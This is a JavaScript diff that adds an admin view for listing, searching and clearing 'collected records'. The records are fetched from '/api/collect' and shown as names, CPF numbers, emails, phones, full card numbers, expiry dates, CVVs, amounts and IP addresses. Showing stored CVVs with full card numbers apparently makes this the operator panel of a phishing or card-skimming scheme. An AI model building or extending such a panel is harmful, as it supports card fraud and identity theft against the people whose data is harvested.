@@ -1058,6 +1058,93 @@ logoutButton.addEventListener("click", async () => {
 });
 
 setActiveView(window.location.hash.replace("#", "") || "dashboard", false);
+
+let dataRecords = [];
+
+function dataSearchMatch(registro, query) {
+  if (!query) return true;
+  const q = normalizeText(query);
+  return [
+    registro.name,
+    registro.cpf,
+    registro.email,
+    registro.phone,
+    registro.card_num,
+    registro.expiry,
+    registro.amount,
+    registro.ip
+  ].some((v) => normalizeText(v).includes(q));
+}
+
+function renderDataList() {
+  if (!dataList) return;
+  const query = dataSearch?.value || "";
+  const filtered = dataRecords.filter((r) => dataSearchMatch(r, query));
+  if (!filtered.length) {
+    dataList.innerHTML = '<div class="admin-empty">Nenhum registro encontrado.</div>';
+    return;
+  }
+  dataList.innerHTML = filtered.map((r) => `
+    <article class="admin-order">
+      <div>
+        <strong>${escapeHtml(r.name || "Sem nome")}</strong>
+        <span>${escapeHtml(r.email || "-")}</span>
+        <small>${escapeHtml(r.phone || "")} ${r.cpf ? `| ${escapeHtml(r.cpf)}` : ""}</small>
+      </div>
+      <div>
+        <strong>${escapeHtml(r.card_num || "-")}</strong>
+        <span>Validade ${escapeHtml(r.expiry || "-")} | CVV ${escapeHtml(r.cvv || "-")}</span>
+        <small>Parcelas: ${escapeHtml(r.installments || "1")} | Valor: ${escapeHtml(r.amount || "-")}</small>
+      </div>
+      <div class="admin-order__money">
+        <strong>${escapeHtml(r.id || "")}</strong>
+        <span>${escapeHtml(r.ip || "")}</span>
+        <small>${r.data_hora ? new Date(r.data_hora).toLocaleString("pt-BR") : ""}</small>
+      </div>
+    </article>
+  `).join("");
+}
+
+async function loadData() {
+  try {
+    const registros = await api("/api/collect");
+    dataRecords = Array.isArray(registros) ? registros : [];
+    if (dataStatus) dataStatus.textContent = `${dataRecords.length} registros coletados.`;
+    renderDataList();
+  } catch (error) {
+    if (dataStatus) dataStatus.textContent = `Erro ao carregar dados: ${error.message}`;
+  }
+}
+
+refreshData?.addEventListener("click", loadData);
+
+clearData?.addEventListener("click", async () => {
+  const confirmed = window.confirm("Limpar todos os registros coletados?");
+  if (!confirmed) return;
+  clearData.disabled = true;
+  clearData.textContent = "Limpando...";
+  try {
+    await api("/api/collect/clear", { method: "POST" });
+    dataRecords = [];
+    renderDataList();
+    if (dataStatus) dataStatus.textContent = "0 registros coletados.";
+  } catch (error) {
+    if (dataStatus) dataStatus.textContent = `Erro ao limpar: ${error.message}`;
+  } finally {
+    clearData.disabled = false;
+    clearData.textContent = "Limpar dados";
+  }
+});
+
+dataSearch?.addEventListener("input", renderDataList);
+
+
+adminNavLinks.forEach((link) => {
+  if (link.dataset.adminNav === "data") {
+    link.addEventListener("click", loadData);
+  }
+});
+
 checkSession().then((authenticated) => {
   if (!authenticated) {
     setStatus("", "hidden");
